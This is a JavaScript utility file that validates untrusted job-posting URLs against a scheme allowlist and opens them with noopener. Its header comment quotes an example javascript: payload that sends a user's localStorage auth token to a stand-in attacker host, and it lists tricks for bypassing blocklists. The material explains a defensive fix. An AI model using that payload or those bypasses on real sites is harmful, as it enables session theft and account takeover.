/**
 * URL safety for anything that did not come from us.
 *
 * THE HOLE THIS CLOSES
 *   Job records reach the UI from the aggregation pipeline — Adzuna, per-board
 *   adapters, and the admin's manual/CSV entry. Their `applyLink` was passed
 *   straight to `window.open()` with no check. A record containing
 *   `javascript:fetch('//attacker/'+localStorage.authToken)` executes in OUR
 *   origin the moment a user clicks Apply, and because the session token is
 *   readable by JavaScript, that is a full account takeover.
 *
 *   Nothing anywhere in the codebase validated a URL scheme before this file.
 *
 * WHY AN ALLOWLIST, NOT A BLOCKLIST
 *   Blocking "javascript:" invites bypasses — `java\tscript:`, leading
 *   whitespace, control characters, uppercase, nested encodings. The browser
 *   is far more permissive when parsing a scheme than a regex is. Deciding
 *   what IS allowed removes the whole class.
 *
 * WHY THE URL CONSTRUCTOR
 *   It resolves exactly what the browser will resolve, including the escapes
 *   above, so we test the parsed protocol rather than the raw text.
 */
const ALLOWED_PROTOCOLS = new Set(["http:", "https:", "mailto:"]);

/**
 * @param {unknown} value  a URL from data we do not control
 * @returns {string|null}  the URL if safe to navigate to, else null
 */
export function safeUrl(value) {
  if (typeof value !== "string") return null;
  const raw = value.trim();
  if (!raw) return null;

  try {
    // A base is required so relative paths ("/jobs/1") still resolve. Relative
    // URLs inherit the page's protocol and are therefore safe by construction.
    const base = typeof window !== "undefined" ? window.location.origin : "https://outmail.in";
    const parsed = new URL(raw, base);
    return ALLOWED_PROTOCOLS.has(parsed.protocol) ? parsed.href : null;
  } catch {
    // Unparseable is not safe.
    return null;
  }
}

/**
 * Open an untrusted URL in a new tab, or do nothing if it is not safe.
 *
 * `noopener,noreferrer` is not optional here. Unlike `<a target="_blank">`,
 * which browsers now treat as implicitly noopener, `window.open` still hands
 * the opened page a live `window.opener` — so it can navigate the tab the user
 * came from to a phishing copy of our sign-in page while they are looking at
 * a real job posting. Three of our four call sites were missing it.
 *
 * @returns {boolean} whether the URL was considered safe and opened
 */
export function openExternal(value) {
  const url = safeUrl(value);
  if (!url) return false;
  window.open(url, "_blank", "noopener,noreferrer");
  return true;
}
